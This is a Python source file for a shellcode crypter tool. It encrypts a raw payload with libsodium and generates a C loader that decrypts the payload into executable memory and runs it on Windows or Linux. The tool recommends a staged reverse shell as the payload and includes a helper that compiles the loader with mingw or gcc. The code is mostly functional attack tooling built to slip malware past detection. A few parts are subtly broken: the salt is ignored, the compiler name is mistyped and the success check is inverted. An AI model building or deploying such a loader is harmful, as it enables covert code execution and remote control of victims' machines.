# TODO:
# Make folder for each shell
# Ask if exe should spawn window
# Ask if exe should be static
# Add colors (cli)

import nacl.secret
import nacl.utils
from nacl.pwhash import argon2id
from pathlib import Path
import cryptonite_parser
from tools.general_tools import read_file, yes_no, write_to_file, ask_overwrite, input_file
import os

def generate_key(ask_save: bool = False) -> bytes:
    key = nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)
    if ask_save:
        save_data_to_file(key.hex(), prompt="Save key to file?")
    return key

def save_data_to_file(data: str, prompt: str = "Save to file?") -> None:
    if yes_no(prompt):
        filename = input("Filename: ")
        if ask_overwrite(filename):
            write_to_file(filename, data, "w")


def encrypt_file(filename: str = "", key: bytes = bytes()) -> bytes:
    key = key if key else ask_key(ask_generate_key=True) 
    
    filename = filename or input("Filename: ")
    while not Path(filename).exists():
        print("File not found. Try again.")
        filename = input("Filename: ")

    file_data = read_file(filename, read_mode = "rb")
    encrypted_file_data = encrypt_data(file_data, key)

    encrypted_filename = f"{filename}.encrypted"
    with open(encrypted_filename, "wb") as enc_file:
        enc_file.write(encrypted_file_data)

    print(f"Encrypted file saved as {encrypted_filename}\n")
    return encrypted_file_data


def bytes_to_c_array(data: bytes) -> str:
    """Convert bytes to C-style array string."""
    return ', '.join(f'0x{b:02x}' for b in data)


def ask_key(ask_generate_key: bool = False) -> bytes:
    if ask_generate_key and yes_no("Generate a key?"):
        return generate_key()

    if yes_no("Load key from file?") :
        filename = input("Filename: ")
        if not Path(filename).exists():
            print("File doesn't exist.")
            return ask_key()

        try:
            return bytes.fromhex(read_file(filename, read_mode="r").decode('utf-8'))
        except ValueError:
            print("Invalid key format.")
            return ask_key()

    key_hex = input("Key (hex): ")
    while not valid_hex(key_hex):
        key_hex = input("Invalid hex. Enter key (hex): ")
    return bytes.fromhex(key_hex)

def decrypt_data(data: bytes, key: bytes, ask_save: bool = False) -> bytes:
    box = nacl.secret.SecretBox(key)
    try:
        decrypted = box.decrypt(data)
        print(decrypted.decode())
    except nacl.exceptions.CryptoError:
        print("Decryption failed. Invalid data.")
        return bytes()

    if ask_save:
        save_data_to_file(decrypted.decode(), prompt="Save decrypted data to file?")
    return decrypted

def decrypt_file(file_path: str = "", key: bytes = bytes()) -> None:
    if not file_path:
        file_path = input("Enter the path of the encrypted file: ")
    if not key:
        key = ask_key()

    data = read_file(file_path, read_mode = "rb")
    decrypted_data = decrypt_data(data, key)

    if decrypted_data:
        output_file = file_path.replace('.encrypted', '')
        write_to_file(output_file, str(decrypted_data), 'w')
        print(f"Decrypted data written to {output_file}")
    else:
        print("Failed to decrypt the file.")


def encrypt_phrase(phrase: str = "", key: bytes = bytes()) -> bytes:
    key = key or ask_key(ask_generate_key=True)
    phrase = phrase or input("Phrase: ")
    encrypted_data = encrypt_data(phrase.encode("utf-8"), key)

    print(f"Encrypted phrase (hex): {encrypted_data.hex()}")
    save_data_to_file(encrypted_data.hex(), "Save encrypted phrase to file?")

    return encrypted_data

def encrypt_data(data: bytes, key: bytes) -> bytes:
    box = nacl.secret.SecretBox(key)
    return box.encrypt(data)

def decrypt_phrase(encrypted_data: str = "", key: bytes = bytes()) -> bytes:
    key = key or ask_key()
    
    if not encrypted_data:
        encrypted_data = input("Enter encrypted phrase (hex): ")
    encrypted_bytes = bytes.fromhex(encrypted_data)
    
    decrypted_data = decrypt_data(encrypted_bytes, key)
    
    if decrypted_data and yes_no("Save decrypted phrase to file?"):
        filename = input("Filename: ")
        write_to_file(f"{filename}.decrypted", decrypted_data.decode(), "w")

    return decrypted_data


def generate_salt() -> bytes:
    return nacl.utils.random(16)

def generate_key_from_password(password: str = "", salt: bytes = bytes()) -> bytes:
    password = password or input("Password: ")
    salt = generate_salt()

    key = argon2id.kdf(
        nacl.secret.SecretBox.KEY_SIZE,
        password.encode(),
        salt,
        opslimit=4,
        memlimit=1024 * 1024
    )
    return key


def valid_hex(hex_string: str) -> bool:
    try:
        bytes.fromhex(hex_string)
        return True
    except ValueError:
        return False


def shellcode_c_crypter(shellcode_filename: str = "", key: bytes = bytes(), platform: str = "", output_filename = "crypted.c") -> str:
    """Encrypt shellcode and generate a C template."""
    print("[!] Recommended payload is staged reverse shell.\n")
    if str(shellcode_filename)[-4:] == ".exe":
        print("Warning: Exe files not supported. Use binary shellcode")
    key = key or generate_key()
    shellcode_filename = shellcode_filename or input_file()

    encrypted_data = encrypt_file(shellcode_filename, key)
    data_c_array = bytes_to_c_array(encrypted_data)
    key_c_array = bytes_to_c_array(key)

    c_template = create_c_template(data_c_array, key_c_array, platform=platform)
    write_to_file(output_filename, c_template, "w")
    
    print(f"C code has been written to {output_filename}")
    return c_template


def create_c_template(encrypted_data_array: str, key_array: str, platform: str = "") -> str:
    """Generate C code template for executing encrypted shellcode."""
    platform = platform or input("Platform (windows/linux): ").lower()
    if platform not in ["windows", "linux"]:
        print("Invalid platform. Defaulting to Windows.")
        platform = "windows"

    mem_alloc = {
        "windows": """VirtualAlloc(NULL, sizeof(decrypted), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);""",
        "linux": """mmap(NULL, sizeof(decrypted), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);"""
    }

    mem_free = {
        "windows": "VirtualFree(exec_mem, 0, MEM_RELEASE);",
        "linux": "munmap(exec_mem, sizeof(decrypted));"
    }
    includes = {
        "windows": "windows.h",
        "linux": "sys/mman.h"
    }
    return f"""
// x86_64-w64-mingw32-gcc shell.c -o shell.exe -lsodium -static
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sodium.h>
#include <{includes[platform]}>

int main() {{
    if (sodium_init() < 0) {{
        return 1;
    }}

    unsigned char encrypted_data[] = {{ {encrypted_data_array} }};
    unsigned int encrypted_data_len = sizeof(encrypted_data);

    unsigned char key_bytes[] = {{ {key_array} }};

    unsigned char nonce[crypto_secretbox_NONCEBYTES];
    memcpy(nonce, encrypted_data, crypto_secretbox_NONCEBYTES);

    unsigned char decrypted[encrypted_data_len - crypto_secretbox_MACBYTES];
    if (crypto_secretbox_open_easy(decrypted, encrypted_data + crypto_secretbox_NONCEBYTES, 
                                    encrypted_data_len - crypto_secretbox_NONCEBYTES, nonce, key_bytes) != 0) {{
        return 1;
    }}

    void *exec_mem = {mem_alloc[platform]}
    if (exec_mem == NULL) {{
        return 1;
    }}

    memcpy(exec_mem, decrypted, sizeof(decrypted));
    void (*code)() = (void(*)())exec_mem;
    code();

    {mem_free[platform]}
    return 0;
}}
"""


# Den är ej implementerad än
def compile_c_to_exe(filename: str, platform: str = "", compiler="", options="", output: str = "out") -> bool:
    """Compile generated c file to executable."""
    platform = platform.lower()
    if platform == "windows":
        compiler = "x86_64-w64-mingw32-gc"
    else:
        compiler = "gcc"
    success = os.system(f"{compiler} {filename} -o {output}{'.exe' if platform == 'windows' else ''} {options}")
    return True if success == 1 else False

def main() -> None:
    """Main function."""
    cryptonite_parser.main()


if __name__ == "__main__":
    main()
